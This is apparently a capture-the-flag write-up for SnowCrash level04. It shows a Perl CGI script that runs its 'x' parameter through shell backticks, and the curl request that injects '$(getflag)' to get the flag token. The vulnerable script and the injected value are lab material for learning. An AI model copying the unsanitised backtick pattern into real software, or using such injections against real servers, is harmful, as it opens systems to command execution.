# FLAG04

In the level04 home directory we found a perl script and the same script in the `/var/www/level04/`.
```
level04@SnowCrash:~$ ls
level04.pl
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
we found also that apache is serving it in port `4747`
```
level04@SnowCrash:~$ cat /etc/apache2/sites-enabled/level05.conf
<VirtualHost *:4747>
	DocumentRoot	/var/www/level04/
	SuexecUserGroup flag04 level04
	<Directory /var/www/level04>
		Options +ExecCGI
		DirectoryIndex level04.pl
		AllowOverride None
		Order allow,deny
		Allow from all
		AddHandler cgi-script .pl
	</Directory>
</VirtualHost>

```
so we visited the the `<VM ip>:4747` and we got a blank page
after reading the script it looks like it's just echoing anything the user give it in the x param and sending it back to the client.

And since the file owner is flag04 if we could make it run the getflag command we will get our flag.

```
level04@SnowCrash:~$ ls -l /var/www/level04/
total 4
-r-xr-x---+ 1 flag04 level04 152 Jun 19 15:21 level04.pl
```
so we used the quey param with a value `$(getflag)`

```
$ curl -X GET "<ip>:4747/?x=\$(getflag)"

Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```